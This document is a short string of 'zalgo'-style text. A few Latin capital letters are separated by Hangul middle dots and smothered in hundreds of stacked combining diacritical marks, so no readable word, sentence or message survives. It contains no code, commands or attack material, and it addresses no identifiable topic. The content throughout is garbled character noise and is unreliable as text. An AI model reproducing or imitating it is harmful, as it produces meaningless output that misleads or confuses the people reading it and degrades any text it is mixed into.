̨̧̧̡̨̨̧̨̧̨̧̠̠̗͉̝̠̪̼͚̫̪͖͓̞̞͍̙͓̪̗̜̥̘̫̩̦̪̹̦͈͚̼̞͉̼̜̳̤͕̞̲̮̱̗̦̠̙͇̬̘͉̺̲͎̟͓̦̱̣͍͓͚̰̼̤̝͈̭̰̲͓̤̗̞͍̤̺͕̞̫͈̟͍̹̳͎̻̩̺͎̥̞̫̟̜̩̮̤̖̜̟̠͈̯͖̱̙̣͎̜̞̫̹̳̙͍̥̬͙̮̣̗̜͜͜͜ͅͅͅͅᆞ̵̨̢̧̨̧̡̧̡̢̢̢̧̨̱͍̼͚̞͓̗͖̰̦̥̜͇̣͉̬̞͖̠̮̫̘̮̘̟̗͉͉̬̯͎̖͎̲̘͇̜̟̖̭̟̫̝̝͍̠͉͍̝͎̥̟̹̙̱̼͓͍̠͚̟͚̞̘̳̦̟̞̩͔̘̠̠͕͈̙̖̱͖͇̘̠̣̖̫̻͉̘͎͔͇̻͉̖̤̬̮̜̝̞̭̩̰̱̰̖̲̱̭̞̗̹̞̰̬̖̣͓̙͚̮̠̺͕͈̙̜͖̜̙̤͉̱̦̘͓̭͍̝͈̞̲̞̣̖̟̫̰͎̺̺͚̠͓̫͈͖̤̟̮̱͓̻͙̮͖̰͓̄͐́̓̊̓̅̎̓̓͐̀̾͋̆̋͌̈̀̋̍̈́̏̔́̽́̓̐̅͂̃̐͂̕̚͘̚͜͜͜͜͜͠͠ͅͅͅͅḨ̶̧̢̢̢̡̢̢̢̡̡̡͈͈̪̪̮̹͙̤͍̞͓̘̹̦̼̬͚̗̭̮̳̬̮̪͔͈͓̥̦̦̤͇͎͙͕̱͔̹̭͍͔̭̤͎̬̝͍̳̪̰̤̫͔̰͔̮͚̞̩̯͕͖̙͖̗̭̳̲̟̤͎͎̹͙̣̥̯͓̝̥͕̬̯̫̯̦̙̣͈̤̯̥͉̰̺̲̫̬̖̻͔̝̠̫̙͓͖̣̪̰͙̗̳̦̯͓͍̪̲̺̮͎͔̙͙̯̙̪̟̬̱͓̹̫̩̺̼̭̗̻̣̪̣͙̩̦̲͚̾̓̏̉͆͜͜͜͜͜ͅͅͅͅᆞ̴̧̡̡̢̧̡̨̡̧̢̧̡̨̧̧̢̨̡̧̧̨̢̨̡̨̨̨̧̨̛̛̛̛̯͖͈̱̮̹͈̭͈͇̻̳̼͔͖̝̻̻̜̹̥̭̥̬̪̖̮̱̦̤̺̙̖͔͓̰͍̯̲͙͙̹̙̙͔̩͈̮̗̤̪̰͇͈͍̙̬̰̲̠͔̙͇̫̟̯̦̙͚͖̫̳͖̞̩͖̰̞̦̥̣̟̹̞̩̻̞͉͓̩̜̲̼̻̭̙̼͖̲̘͓̪̘̜̠̟̼̗̮̝̤͉͍̣͎̭̙͔̖͇̙̭͈͕̙̝̩̝͇̩̖̣̖̮̥͓̺̪̙̣̻̭̭̲̘̠̘̝̲͚̬͎͇̰̪̺̩̘̩̪̙̺͓͓̱͔͎̺͚̳̙͇̳̰̞̣͚͔̮͈̙̜̥͕̜͕̱̥͈̣͉̘͙̜͚͔̥̖̤̻̳̣̙̜̖̝̻̠̯̳̝̼̰͉̹̞͉̞̠͕̭͍͖̼͖̰̜͕̩̩͇͖̤̘̩̺̬̜̣͍̪̪͇̻̤̤̦̪͎̟͎͎̙͍͍͚̞̮̞̣͉̑̒͌̀̓̅͌́̈͊̊̃̋̏̈̎͛͋̿̇̌̓͌̉͆̓͐͐́̀̒̉͛̒̀́̎̋̅̆̽̾͗̈́́̎̆̃͆̈̋͗̐̋̑͗̒͊͊́͌̋͂̆̏̈́̍͋̀̆̈̎́̋́͊̂̀͛͆͊̐̍̈́̾̀̓̍͑̽̽̃̋͋̿̂͋̃̍̽͂̒̈́͆̀̀́̈́̏̈̉̋̓̒̂̄̒̑́̊̇̇̈́̏̽͑̿̇̎̋̋̎̽̂̏̀̒̓́̒͛̋̈́̇̃̉̌̒͛̄̈́̏͐̆̀̉̈́̄͋̌̐̆͑̐͑̀̈͗͋̌͒̅̃̈̈́̃͊͆̿̀̈́̍̔̄̑́͊͒̈͂͂̊̑̂̈̅͂̀̌̂̋̏́̇͒͛̌̑̀͊̄́̋̏̃͛͌̂͆̎͊̔̒͛͒̔͆̾̚̚̚̕̕̚̚͘͘̚̚̕͜͜͜͝͝͝͝͠͝͝͝͝͠͝͝͠͝͝͠ͅͅͅͅͅ ̵̡̛̮̤̜̠̮͚̞̖̲̹̺̯͈̮̪̪̳̬͖̹̩̟̲̱̥͇̣̠̠͕̟̗̩͙̺̫̫̝̮͕̯͓̮͈͇͚̰͊̍͌̓̃̊̇̽̐̿̄̅̀̓͋͐̾̽̈́̽̆̿͑͐͊͊́́͒̃̈̇̀̆̅̆̔̿̌̓̈́́͊̆͆̂̓̅͗̈́̾̐̓̇̌͑̂̾̈́̈́̌̑̏̀̉͋̀̈́͋͗̀̚͘̕̕͘͜͠͝͠͝͠͠͝ͅᆞ̵̧̡̨̨̨̨̧̛̛̛̛̛̜͖͔̠̮̰̲̰̳͕̖̤̙̥̹̼͎̪̜͖̟̙̬͕̘̟̠͙͇̩̲̫̠̖̗̦̬̣̺̣̼̪͓̜̰͉͔͉͓̱͇̱̜̭͍͓͙̳̪̫͚̩̤̰͎͇͎̘͎̲̫̯̭̱̻͓̪̲̪̙̮̺̰̘̳͈͙̱̟̬̜̠̬͖̻͈̰͓̰̘͉̖̖̯̲͔̪̯͍̼̩͖̜̙͔͕̞̘͍̗̺͔͇͖̖̖͚̲̘͙̫̀͗͛̈̐͒̎͗̐̀͆̓̎̌̅͗̀͂́̐̽͑̈́͆͋͐̒̈̑͐͐̎̊̉̄̋̈́͋͊̍̌͑͐̇̂̔̓̇̏̈́́̾̾͌̎̐̂́̎̾̈́̾̈́̏͘͘̚͘͘͜͝͠͝͠͠͠ͅͅL̸̨̢̨̧̢̨̧̧̨̧̧̡̡̢̧̧̡̢̹͉̰͇̰̤̲͎͈̩̼̥̙͖̰̳̹̺̺̱̖̞͕͍̠̰̞̞̰̙͚̰̺̪̹̼̥̬̙̪̮͍͈̞̞̩̮͓͈̗̟͉̳̣̟̮̩͈͎̘̠͖̗̟̟͖͓̯̠̺͍͕̳͍̥̥͙͈͓̩̣̤͖̰̖̣̹̹̤̠̩̫͕͖͕͈̝̰͙͍̮̱̟̬̩̦̻̬̜͇͓̜̮̮̗̗͖̬͇̙̞̗͍̘̺͕̥̦̣͕̱̯̝͉̹͍͕̱͉̂́͌̈́̆̓̃͊̏̌̈́̅͒̍̾̐̇̅͂̈́͌̔̂̋̏͗͜͜͝͠͠ͅͅͅͅͅͅᆞ̸̢̡̡̨̨̢̧̨̡̢̡̢̢̢̡̧̧̡̢̡̧̨̨̨̢̡̧̨̨̨̡̨̧̢̧̛̛̛̛̛̛̛̗̩̭̳̩̳̯̭̪̬̜̙̟̱͉̹̲̖̰͍̮̩͍̰̘͙̟̬̞̳͔̘̜̞̗͉̪͖͈̳̩͈̞̮̱͖̫̜͇͕͎̜̱͙̠̖͚̝̤͚̱͈̳̺͓̲̻̞͙̟̻̩͓͚̩̖̰̟̟̲̩͔̱̗̼͉̻͇̣̫̪͓͖͖͈̝͔̟̺͙͓̗̗̝̻̣͓͎͉̬̯͎̤͕̬͖̳̺̮͍͇̲̪̮̠̻͚͖̪̯̲͉̜̩͍̥̻̫͖̦̝̥̤̤̖̼̥̙͖̺͓̤͔̦̝̱̰̜̱͖͖̮͈͕̻̳͔̻̙̱͕̰͇̹̗͚̼͚̭̖̭̻͚͓̣̤̖̪̤̺̪͎͇̤͖̤̪͈̗͍̪̭͎̪̰̜͇͚̭͔̼̰̩̞̳̼̱̙̣̮͔̬͇͚̼̝̖͇̟̳̥͚̗̞̘͋̏̉̈́̐͊̌̌̔͐̓̅̆͑̉̒̄̀̊̈́̈́̐̇͗̅̈́̑͊̇̊͌̆̈́̀̇̔̿͑̆͌͑̄͆̃̅͌͊̾̉̅͌̍́̋͊̎̋͋̋͊͗̀̊̾̉̈̅̇̅̿̔̍̽̒̽̍̌͐͊́̑̒̄͗̑̑̿̈̏̊̀͐̄͂͆͋͑̄͌͆̃̇̽̐̍̌̈́̂̈́̌̽̈́̿́̇̀̌̅͂̿̒̊̂͛̐́͑̄͋͑͊̍̌̂̋̐͂̑̄̎̊̃̍̇̎̔̉͒̚̕͘̚̕̚̕͘͘̕̚͘̕͜͜͜͜͜͠͝͠͠͝͝͠͠ͅͅͅͅͅᆞ̷̡̨̡̨̨̢̡̡̨̨̡̡̧̢̢̛̛̛̛̝̼͕͈͍̞̠̜͍̯̯̭̟̦̜͖͕͎̳̺̲͎͔͈̘͉͙̖̻̠̟̪͈̯͈͙̤̰̘̯̠̦̟̥͎̜̬͔̜̖͈͍̗̮̺͉̗͙͚̥̞̗̻͕̱̤̘̪̪͓͍̙̩̺̲͕̩͍̖̱͍̙͙̖̫̲̫̼͇͇̳̤͇̲͓̠̠͖̫̰̼̜̙̬̺̰̱̗̙͇̻̱̯̺͉̠͚͉̯̝̗̹̤̲̏̂̓́͑͐̄̌́̄̓̾̇͗̊͆̏̆̈͗̎̎͌̓̀͒́̽̑̍̂́́̎͂̓́̂͒̂̄̑̒̿́͋̅̏̋̌̐͌̊̑̐̎̀̀́͊̌̑̂́̅̒̔̆͆̍͒͋́̀̊̌͌̍̇͂͌̅͛̽̒̓̏̋̌̌̾̇͆̆͌͂́̑͆̐̋̇̇̿̏͛̀̓͛̈́̀̈́̈̈̀͑̀͂̈́̏̒̓͋̋̉̿̈̇̊̒͗̀͐̇̑͛͆͐̔̒͐̍̋̀̍̃́̓̓̐̌͋̎̽͒̔͛͆͛̉̅̓͋̃̆̆́̅̍̀̈́͌̑̓̀͂̈́̎́́̐̊̐̽͐̈̅̈̏̌̐̊̈́͌͛͘͘͘̕̕͘̚͘͠͝͠͝͝͠͠͠͝͝͠͝͝͝͠͝͝͝ͅͅͅͅͅƠ̵̧̧̧̨̧̧̡̡̧̢̧̨̨̨̧̢̨̢̢̡̢̢̡̨̨̧̢̛̺͕̳̹̗̲̱̙͎̥̥̼̭̥̟͇̮̺̥͖̹̖̗̘̰̘̞̲͕̗̣̣̭̳̟͍͇̪̠̗̱̻̫̬̖̳͇̺͉̳̘͎͍͚̙̲̖͚͖͙̣͍̙̠̱͎͖̼̜̦̲̻̙̮̞͙̩͖̪̖̼̜̮̤̲̠͎̪͈̝̩̻̤͚͉͍̲͉̤̪̠͙̱̫̬͖͖̭̬̣̟̻͓̗͇͚͖͇̪̣͇͍͍̼̟̰͚̳̻̱̖̦̠͇͍͍͖̘̘͙̹̘̤͎̤̭̟̱̹̣̠̪͈̝̠̩̯͖͖̺̠̟̙͚̹͇̼͚͕̣͕̲̪̭̞̱̯̰͓͔̻̠̱̻͈̩̙̘͎̮̝͓̬͍̼͕̟̼͙͓͍͙̜͉̺͔̱̹̯̪̗̰̥̯̫͉͓̭̤͕̮̝̘̭̺͍̺̮͉͉͎̙̘̠͍̙͖͚͌̓̾̏̈́̿̆̋̍͑̈́̽̉̿̈́̽̏̀͋͗̍̅͋͆̓̾̎̐͌̆͒̂̂͛̍̍̈́͋͗͋̃̐͌̈́̍̐̆̌̌̉̊̎͛̓̒͑̍̈͂́̃͛̈͌̆͋̔̐̆̅̔̎͐̊͗̒͗̀́̑̾̍̔͐̋́̓̓̔̈́̾̓̓̔̋̅̑̂́͋͊̈̌̈͋̆̔͆̈́̑̑̉̀̚̚̚̚͘͜͜͜͠͝͝͝͝ͅͅͅͅͅͅͅᆞ̵̡̡̧̧̡̢̨̨̢̡̨̧̧̧̡̢̨̢̢̧̡̨̡̧̻̫͈̠̣̝͎̖̹̺͚͕̖̳̺̦̭͕͉͕͉̜͓͚̟̣̞̩̜̤̯͍͈̗̲̜̩̤̩̺̰̬̳̣͍͍̘̯̣̤̮̯̠̗̘͇̗͖̭̥̰̝̣̫̞̬̹̺̬͕͉̰̣͍̞̖̣̤̖̻̹̼̟̟̘͔̱̙̹̱͔̬͎̖̩͙̯̩̥͉̳͍̩͔̝̟̖̝̥̜̝̳̪̹̩͙̜̱̩̮̻̱̪͉̭̘̱̥̞̹͈̲̠͖̝̰̻̼̘̖̝̘͙͓̣̭͔̥̥̼̦̹̠̩͈͍͈̳̺̣͓͓̰̬̤̲̥̩̱͚̪̠̺̦̘̠͓̖̜̖̭̹̼͙͓̭͖̰̖͕̼̞͕͎̬̩͇͔̭̻͙̞̤̬̫̣̘̼̼͈͇̼̖̺̫̙̠̙͈̥͕̣̜͉̣̯̭͚̜̯̻̹̥̲͙̥̞̲̓̂̎̄̇̑̔̌̈́̒̊̀̾̉̎̕͜͜͜͝͠ͅͅͅͅͅͅͅᆞ̵̧̧̨̢̨̡̢̨̡̧̡̨̨̡̡̢̢̧̨̨̡̛̛̫̰̙͈͈̦̯̙̙̬̤̤̲̳͙̞͇̥̻͇̦͕͉̗̠̬͓͙̝̦̯̳͙͎͈̹̼͙̞̞̗̼̗̺͕͕̠̳͔͖̝͎̬͇͙̩͎̲͈̫̱̥͈̹̦̜͓͎͎͉͍̱̞̭̦̩̱̮̜̮̟͍̺̮̳̭͎̺͇͇̦̝̟̱̙̰͈͍̺͇̯̭̥̥̦͚̘͚͙̼͕̹̪̲̪̱͚̹͙̤̤͎̜͓̣͓̗̘͕͙̘̹̘̞̖̰͖̩̗̰̪̪̝͉̼̱̜̬̻̭̙̗̙͔̺̮̺̠̯̫̥͉̦̖̫̲̳̹̤̭̱̮̗͈̼̤̻̹͇̭̟̜̳̣͕̬͖͓̖̗̤̠̲̞̙̲̜̖̖͚̬͉̯͖͖̼̣̦͕͔̣̭͖̮̻̠̝̗̹̟̮̫̘̳̻͙̩͚̰̺̯̤͕͉̭̻̯̝̺̼̘̐̾͆͋͒̊͂͊̑̑̈̐͗̔̐̾̀͋̂̾̎͊̀͗͆̂̾͛͐͂̇̄̾̄̓̓̐̈̈́̉̓̈́̑̈́͌̊̈́̈́́̅̐͊͆͆̑̆̉̓̓̉̀̏̀́͐̂͂́̓͛̓̅́̍͂͘͘̕̚̕̕̚͜͜͜͜͜͜͜͜͝͝͝͝ͅͅͅͅͅͅC̷̢̛̛̛̛̛̛̛̛̛̠̟̫͖̪̿̇̅̋͛̆̆̓͊͆͐̄̍̇̆̾̀̎̾̈͆̈́͑͛̾͊̓̀̍̉̓̀̎͋͌̔͒̆̌͋̒̌͛͊́̋̐̅̓̅̽̅̑̒̉͌̑̓͊̊͊̌̐̋͋͂̽̔̿̌̂͋̽̈́̌͂͐͂̈́̄̌̈́͋̍̌͋͊́͂̿͌́̀͊̿̈̀̂̽̈́̈́̅̀̉̑͊͂̈́͋͑͗̃͂͗͛̇̍̌̓̀̏̑́̔̃̓̈́͆́͋̈́͑̒͐̇͌̔̐̀̐̍̽̓̈́̎̎͊̾͛͊̓͐̋͒̒̽͗̊̀̀̽̉͐̀̈́́̏̄̃̏̅̀̃͊̈́̈́̃̔̄̾͑͆̄͆͂́̈́̐̈́̆͌̅̕̚̕̕̕̕̚̕͘̕̚̕͠͠͝͝͝͝͠͝͠͠ͅᆞ̷̡̡̡̢̨̢̛̩̺̰͓̜̲̙̮̤̱͓̻̫͙͓̘͔̟̮̫͚̲͖͈͙̤̠͎̘̥͕̭̼̗̘̖̳̠̦͕͚̝̺̟̦̤̫̣̣̳̜̣͓̱̘̹̟̲͕͍̦̣͚̘̤̈́͊̋͊͌͋̄̎̌̿̀̐͒̂͌̀́͛̓͑͋̿̑̋͗̿̅̐̀̒̇̎̔̀̈́̍̊̾͑̀̌̿̋̉̂̈́̈́͆̈̃̿̆͑̔̾͌̐̈́́̑̉͒̒̆͑́̔͐̉̆̈̎̈́̇͆̑̔͂́̑̑͒̐̀̑̂̎́̆̓̉̀̍̇̇̚̕̕͜͜͠͠͠͠͝͝͝ͅᆞ̴̢̡̧̢̢̢̨̨̛͈̗̣͚͔̪̝͎̫̺̯̺̭͓̬͚̰̭͈̰̠̦͕̘̟̱̬̯̲̦̭͇͎͎̲̞̮̝͈͕̗̻͎̱̼̳̻̦͓͚̭͈͎̰̪̖͍̗̬͓̤̙͉̙̣̱̹̯̖͈̩̳̪̺̖̞̗̯̩̻͖̩̱̱̮̫̥͕̟͕̤͔̻̠͇̣̦̣̩͕͖̝̞̜̯̜̦̭̥͓̣̬̥̖̪̼͍̪͊͆̍̇̈́̎͛͐͂̄͒̔͋̄͒̽̓̒̏͊͊͑̔̃̓́̎̑͛͊̔̈́̌̑́̈́͐̾́̔̿͐́͐̍͌́͒̉̊̎̏͛̆̐̂̎͑͛͗͛̍̊̽̿͋͆̾͗̐̅̇̾̆̇̑̇́̊̾̍̏̇̉̌̿̂́̑̇͂̀̍̍̊́̾͗̂͐́̈́̆̇͌̒́̏̅͂̾̈̅̎̉̇̈́̍̋̈̊͘̕͘͘͘̕̚͘͜͜͜͝͠͝͠͝͠͝͠͝͠͝͠͠͠ͅĄ̶̧̧̧̡̧̡̧̡̡̧̨̢̧̧̧̧̧̡̛̯̞̤̰͈̭͇̹̘̦̯̲̩̜͖̘̭̹͓̲̲̭͖̜̭͕̠̳͕̥̭̗̮͈͔̦̗͖͈̬̼̝̱͙͓͈̗̮͚̼̫̝̣̰̪̪̘̝̰̦͎̦͇̙̻̠̟͇̞̦̭͈̱̖͓͔̥͉̬̣̠̘̟͕̞͔̤͇͕̘̻̖͈̳̺͔̳͇̙̼͎͍̮͈͇͔̠̞̖͙̰̥͕͔͍̻͉͇̪͉̝̔͋̍͒̒̈͗͊̈́͌̇̃̂͒̃͗͂̃̍͐͜͜͜͜͜͜͝ͅͅͅᆞ̷̡̨̡̨̢̡̢̧̡̢̢̢̧̢̢̡̡̧̡̨̡̛̛̛̛̛̛̼̩̮̭̰̞̹̫̝͍͎̥̗͈̲͔̲̘͔̻̫̝̖̦͖͖̯͙̣̱̲̗̭̗̝͖͎̤͓̹̙̠͚͔͎̖̱̣͔̻͕̥͚̖̦͇͉͎̪̬͇͚͎̩̳͓̝̘̳̮͕̘̫̻̹̞̙̫̦͚͉̙͚̣͖̰̭̖͉̗̱̲̘̜̫͇͚̖͈̰̝̤͚̣͔̪̺̳̱̤͍̪̥̠̠̻̝͈̹̬̞̬̪͕͔̘̲͖͍̳͇̣̲̜͚̩̰̤̻͉̭̞̤͎̺͚̗̟̝̫͕̬̼̣̪̤͇̩͇̝͕̠͓̘̖͉͎̜͖̜̳̖̰̦̠͚͉͖̖̬̟̮̦̠͔̯̼͓̱͖̱̫̭̤͔̰̻̙̫̬̮̳̭͎̟̭̯̙̭̩̖̩̼̻͎̮̗͎̝͙̖̠͙͚̙̣͔͙̞͕̤̰̖̖̭͚̰̲̳̜̼̤͍͚̙̦͕̣̰̝̲͈̫̦̲̰̜̯͍̟̠̀̍̄̏̀͒͌͆́͂͆̓̆̃̔̀̄͗͊̍̈́́̅͆̌̈̇̏̃̇̎̀͗̆͂͛̐̍̃̑̓̈́͌̈́͌̈́̊̐̽͗́̿̆̇̑͆̋͒͌͒̀͑͐̊̓̃͑͌̅̈́́͋̈́̏́̿̊̅̐̂̎̏͋͆̐̌̌̑͋̀͒́͂̊̋̃̑̊́̀͋̓͑̃̾͑́͒͒̒̓̈́̈́̐̊̋̇̍́̊͐͐̎͛̏̈́͆̅͒̅̐̈́̿̐̐͆̑͆́̆̑̈́́͊́̊̐͒̊̾́̀͋̿̚͘̚̕̕̚̚͜͜͜͜͜͜͠͝͝͝͝͝͝͝͠͠ͅͅͅͅᆞ̶̡̨̨̢̡̢̢̢̨̨̨̡̧̡̛̛̛̛̯̘͎̩͙̠̺̞͓̳̯̣̰̩͉̞̘̱̖̹̳͓̘̱̳̘͈̟͉̳̝̲̫̤̖̜̜͕̬͓̦̩̫̙͙̥͖͙̹̝͎̻̪̻̭̩͇̜̙͓͈̞̹̺̣͉̭̜̪̦͔̳̩̮̥̺̳̞͓̪͙͓̙͓͈̞̹̦̙̲͕̣͈̯̻͈͕̟̻͙̞̥̼̰̰̬̺̗͎͖̤̞̤̞̹̙͚̞͍̱̦̰̻̜̹͙̘̳̹̘̠̰̼̰͕̲̪̲̘̻̜̣̥͔̣̮͖͇͇̖̜̰̻̲̜̯̖͇̝̹̳̣̳̠͉̻͎̻̖̰̫̘͕̠̬̲̱̤̪̟͓̳̻̺̤̻̦͍͈̳̱̦̲͕̱͍̻̖̲͈͔͉̲̣̠̤̜͙͍͍̩̲͚̖͈̳͈̻̪̮̗̪̰͍̥̲̻͔͕̟̻̱̎͂̊̍͌͆̿̃̈́͆̎͐̄̑̿͆̀̊̆̄̓̈̈́̾͋̂̋̊͌͆̂̓̎͛͒̀̉̊̈̈̅͛͐͒̇́̇͊͒̑͂̍̇̌̆̾̌̎̉͋̆̎͛͋͛̀́̊̀̀̉̀̎̑͌̆͛̀́́͆̂̒̈́̑́̀̊̽̍͛͆̄̑͌̇̔́͌̊͒͋̉͌́͗͒̃̔̄͌̓̇͐̽̃͐͂̽̈́̏̾̌͒́̈̅͊̋͗̋̏͌̏̈́̿̓͛͗͗͂̅͗̔̉̓̃͂͒̆̈́͑̽͊̅͗̉͑̄̏͌͌̈̋̓̉̉̂̓̆̌́̐̈́̉̿̌̎͊͛̔̐̓̈́͆̀̒̑͗́̌́̾̀̄̏̉̑͆͊̏̾̍̉͆̋́͊̏͒̒̃̔̊̂̑͑̂̂͐̈́̈́̊̔̋̐͒͑̑̋͒̔̋̈̾͐̅̋̉̅̎̈́͌̕͘̚͘͘͘͘̕̕̚̚͘̕̚͘͜͜͜͜͝͝͝͝͠͠͝͠͝͠͠͝͠͠͠ͅͅͅͅT̶̡̢̧̡̢̨̧̡̧̧̨̧̢̡̢̨̧̢̧̧̨̨̡̨̧̢̨̢̧̛͈̲̜̼͙͇͇͔̱̳͍͕̳̖͎̼̯̘͎͕͓͍͎̼̻̳̗̝̬̼̞̣̲̹̥̼͚̹̻̠͍̼͎̜̲̳̫͔͉̠̳̜̘͕͙̰̙͍̬̱͖̤͍̲̙͎͔̱̗̮̮̺͎͔̪̟̝̮̱̘̳̹͓̲̜͍͇͕̝̟̠̳͖̻̤̹̱͔̱͕̟̙̻͕̤͕̫̙̘̗̭̰̜͔̯̮͓̤̰̳̝̠̞͚͕̮̼̤̱̥͎̝̪̹̟̘̺͖̲̼̣͎͔̪̺̩̹͉̤̮̳̜̟̣͈̟͓̖̼̣̙̪̬̪̻̠̙̱̹͎̣̗̩̩̼̗͚̰̟̯̳̫̜͉̗̦̹̖͈̮̳͙͕̠̞͇͓̼̗̼̠̲̪̬̤̤̠̳̙͕̯̜̙͉̥̩̼̫͉̮̹͕̞͉͇͈͕͎̹̙͕̻͖͕͔̯̣̻͉̼̪̺̲̳̰̼̹̦͓̜͙̬̪͉̖̳̋̇̍̆͛̈͂̄̽̏̇̌̍̃̂̍̈́̊̌̌̃̔͂͌̈́͑́͒̈́̒͆́̉̎͗̑̀͒́͋̅̃͌̌͂͐͋̌̅̎̇̃͑̈́̉̿̓͋̏̇͊̈́͛̃̉̊̀̄̆̈́̃̓̾͂̽͊̓̋͛̉̈̈́̆̑͂̅̔̀͌̑̀͐̉̈́̓͐͊͒̍̅̓̎̈͐͊͗̕̕͘̚͘͘͘͜͜͜͜͜͜͜͝͝͝͠͝͠͝ͅͅͅᆞ̴̨̨̨̨̡̢̢̢̡̡̨̡̡̨̢̧̡̛̩͈̫̼̠̜̞̠̦̠͓̠̤̟͇̯̻̭͓̭͕͉͈̖̳͎͚͎̠̰͖̟̳̘̬̮̙̝̬̰̳̲̝̙͚͕͖͇̘̪͉̼̼͉̪̜̟̞̹̼̼̼̗̦̲̦̟̘͔̲̗̬̙̗̫͖̟̻̝̣̜̺̳͇̯̗͚̙͎͙̯̞̯̙̫̹͙͚̟͎͚̣̬͎̹͍͈̪̯̞͚̭͚͚͔̰͎̰̘̱̺͚͇͍̘̦̗̼̟͚̞̟̰͚̙͍̫̠̫̪̠̬̟͇̘͎̲̭̙̤͚͖̩̮͉̲̪̣̞̩̞̹͎͚͍̜̫̞̥̳̭̯̰͍͉̜̟̜̟̝͎͕̻̞̩̻̬̼̱̭͉͖͚̖͓͇͇̘̫̺̫͈̣̝̠̼̥̋̀̈̑͑͐͊͆̾̈̈̒̏̌͌̾̌̅̎̂͌͂͌͐͆̉̓̃̈́̎̽͆́̌̒͌̀̆͗͌̆̾̿͑̂̋̒̇͊̔̾͐́̆͌̈͐̓̐̈̋̇̋͊̈̾̌́̉́̌̎̈͗̄̈͗̈́̏̉͌̓̑̏̒̅͒͆̑͊̈́̐̿̈̀͐̋͐̽́̾́͒̍͗̓͛́͒̈́̐̌͊̽̂̀̊̓̊̈́͊͋̈́̄͋̽͊̐̈́̿̎̈́̍̓͛̆̈́̐̊̽̆̽́̿̐́̽̍̔̀̃̾̋͆̈́̈̏̇̈́̉̆̅̽̽̒̈͛̑̍̌̾̾̂̀̂̀̅͛̃̽̿̾̚̕͘̚͘̚͘̚̚̕̕̚̚̕͜͜͜͜͜͜͜͝͠͝͝͝͠͝͝͠͝͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̡̧̨̨̧̡̨̧̡̧̢̧̨̢̡̨̡̢̢̨̡̧̢̨̡̢̧̧̛̛̛͕͎̺͍͎̫̭̞̺͔̭̹͈̲͈̤̰̫̲̺͖̱̣̮̙̹̘̟͇͇̖̗̯̣̙͔̖̖̳̙̠͖̱̣̘̺͙̙̯̠̹͚̩̞̜̺̠̮̬̦̯̺̲͚͎͓͇͈̩̝͇͔̰̝͕̘̬̭̖͉̝̼̝̣͓̼̖̭̫͈̦̟̙̜̮̪̪̫͇͚̜͎̮̣͎͚̖̫͔̳͇̗̼̦͈̭̮̙̭̖͈̘̱͖̦̲̲̳̱͈͍̹̦̣̼͕͔͈̝̻̘̞̲̥̥̞̖̗̩͕̼̬̞͓̦̫̩̳̫͚̮͎̮̗̘͇̗̹̳͚͍̱͓̥͉̙̬̙̭̪̪̖̩͔̳̟̤̻͙̦̬͈̣͎͍̖̻̖̪̻̩̖͙͚͇̤̟͚͎̮̖͈̻͉̣̟͕̥̱͕̩͙̲͕̱̼̹͓̥̠̝͇̖̪̹̜̮̝̣̞̖̦̟͉̰̖̪̣̺͙̙̮̪͚͔̱̙̼̽̿͒͆̋̃͗̿̓̆̔́́͑͊̑̾̄͐͒͂̅̂́̆͒̽̋́̈́̏̿͑̿̈́̿̀͑̎̏̌̂̈̾̋̒͒̐̊̾͛͆̊̃̀͌̓̈́̌͗̽̾̔͑̔͛͐͒͛͆̇̆͊̓̋̇̈́̃̔̒̈̑͗̍̆̆̑̌̓͐͐͘̚̕͘̕͘̕͘̚̕̚̚̚̚͜͜͜͜͜͜͜͝͝͝͝͠͝ͅͅͅͅͅͅI̶̧̨̡̨̨̢̧̢̢̡̢̢̨̧̛̛̛͔̝̤͙̬̼͕͈̯̦̰̘̯̝̮͓̭͎̞̳̙͙̭̯͎̲̞̼͚̼̩̩̬͚̝̥̰̠͓͈͍̲͉̦̬͍͚͔̮̱̪͉̲̹̠͔̖͍̥̫̠̳̞̺̞͇̺͖̞̭͈̪͎̟͉̪͔̣̣͚͕͎̼̳̘͎̜̗̺̦͓̱̻͈̞̠͔̯̬͚̩̯̮͎͚̼̥̝̩̯̮̙̯̰̮̰̦̣͇͎̺͎̤̖̟̳̥̖̗̥̜͓͉̫̺͎͙̘̙̰̙̗̣̥͈͚̣̝̩͙̠͙̬̟̘͇̣͖̽̐̓͐́̈̉͌̐͆̓̂̀̎̐͗̏̆̀̌͆͋̀̍͐̏̂͂̽̎̋̈́̌̅͆̋͐̈́̊͊̀͒͌̓̌̀̊̂̀̔̇̒̑͛͌͂̋̒͋̀̄̌̈́̏̀̔̑̈́̔̍̉̅̈́̀̐͒̈̓̌̓͗̀͒̂̈́̅̀̾͑̃̈́̂̉̽̒̑̒̇̉͂͊̌̏͗̀̅̃͌͌̂́̈́̉͌͒̈́͌̈͐̆̽̆̐̏̉̔̾̀̆̈́̒̈́́̎͐̾́͗͒̂͑̒̉̀̋̿̀̊́̆̈́̿͂̈́̍͌̋̎̌͆̑̈́̓̒́͑̎̌̾̏̊̍͋̍͆̾͛̾̽̈̓͐̀̎̽̓̑͗̅͒̋̅̈̌͒́͐͐̈́̾̈́̀̆́̌̎̋̓̀̿́͊̎͆͊̆̐́̃̂̐̂̐̀̍̈́͊̊́̊̋̔͗͒͗́̋͐̈̆͊̋͛̇͆̒̄̈́̓̚̕̚̕̕̕͘͘̕̚͘̕͘̕̕͘̕̚̚͜͜͜͠͝͝͝͝͠͠͝͠͠͝͝͝͝͝͝͠͝͝ͅͅͅͅͅᆞ̸̢̨̢̧̨̛̛̛̛̛̛̛̛͇͚̮̮̺̼̰̗͍͓̣̹̥̥̣̠͔̪̫͎̮̺͉̖͇̘͉̲̬̙͙̩̗̝͈̗͚̱̟̘̪͓̬͍̺̗̞͙̙̬̹̭͇̱̮͉̞̜̲̟̲̟͉͚͚̱̰̙̦̗̝̗̮̬͓̰̞̬̼̞̟̲̗̬͚̦̮͕̹̜̥͙͉̟̠͓̫͔̞̌̂̌̐̐͂̌̊̀̒͂̉̐̀̂̒̑͗͛̐̀̏͂͐̃̐͆͒̃̊͒̔̀̂̓͛̑́̈́̀́͋͋̄͑́͑̔̓͐͑̿̎̎̓̿͌͑́͋̈́̿͛͑̌̈̇̊̆̄̂͑́͌̑̊̂͗̂́̾̍̾̌̀̑́͋́̆̓̀̀̓͌̎̇͋̓̎́̅̎̈́̉̌̂̾̌̔͊͑̓̈́̋͗̆͂͐́͑́̀͂̈́́͗̾̈́́̆̇̿̿͗̅̎͑̍̎̅̍͒̓̓̎̓̔͋͘̚͘̚͘̕̕̚̚̚̕̚̚̚̕͘͜͜͝͝͠͝͝͠͠͝͠͝͝ͅͅͅͅ